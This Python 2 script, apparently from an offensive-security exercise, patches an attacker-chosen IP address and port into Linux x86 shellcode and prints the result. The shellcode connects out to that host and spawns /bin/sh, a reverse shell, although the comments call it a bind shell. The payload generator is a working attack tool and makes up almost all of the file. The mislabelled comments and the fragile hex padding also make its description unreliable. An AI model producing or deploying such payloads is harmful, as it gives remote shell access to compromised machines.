#!/usr/bin/python
#Author: sagar.offsec (VL43CK)
#File Name: manageIPAndPort.py
#Description: This script will change the bind port in the bind TCP Shellcode and give a new payload with updated port no.
#Shellcode:"\x31\xc0\x31\xdb\x31\xd2\xb0\x66\xb3\x01\x52\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\xb3\x03\xbf\x80\xff\xff\xfe\x83\xf7\xff\x57\x66\x68\x15\xb3\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x31\xc9\x31\xc0\xb0\x3f\xcd\x80\x41\x80\xf9\x03\x75\xf6\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xb0\x0b\xcd\x80" 

import struct
from operator import xor
import string
#Get New IP from user
ip_addr = raw_input("Enter IP: ")
addr = ip_addr.split(".")
for i in addr:
	if(int(i)>255):
		print "[-] Invalid IP Address"
		exit()
#Get New Port from User
new_port = int(raw_input("Please Enter New Port No.: "))
if(new_port > 65535):
	print "[-] Invalid Port Number"
	exit()
if(new_port < 1024):
	print "[!] Warining: You must be root to bind shell on port:", new_port

#Modifying PORT Number
print "[+] Modifying PORT in shellcode with given Port:", new_port
print "[+] Hex for Given Port:", hex(new_port)
a=1
string=""
port = hex(new_port)[2:]
port_len = len(port)
for i in port:
	if(a%2!=0):
		if(a==port_len):
			string+="\\x0"
		else:
			string+="\\x"			
	string+=i
	a=a+1

#Modifing IP Address
ip_hex = ""
for i in addr:
	ip_enc = hex(xor(int(i), 0xff))
	ip_enc = ip_enc.replace("0x", "")
	ip_hex = ip_hex + ip_enc

print "[+] Modifying IP Address in shellcode with given IP:",ip_addr
print "[+] Reverse HEX for given IP: 0x"+ip_hex

a=1
ip = ""
for i in ip_hex:
	if(a%2!=0):
		if(a==len(ip_hex)):
			ip+="\\x0"
		else:
			ip+="\\x"
	ip+=i
	a+=1			 
shellcode = "\\x31\\xc0\\x31\\xdb\\x31\\xd2\\xb0\\x66\\xb3\\x01\\x52\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc6\\xb0\\x66\\xb3\\x03\\xbf"+ip+"\\x83\\xf7\\xff\\x57\\x66\\x68"+string+"\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\xcd\\x80\\x31\\xc9\\x31\\xc0\\xb0\\x3f\\xcd\\x80\\x41\\x80\\xf9\\x03\\x75\\xf6\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x89\\xd1\\xb0\\x0b\\xcd\\x80"
print shellcode
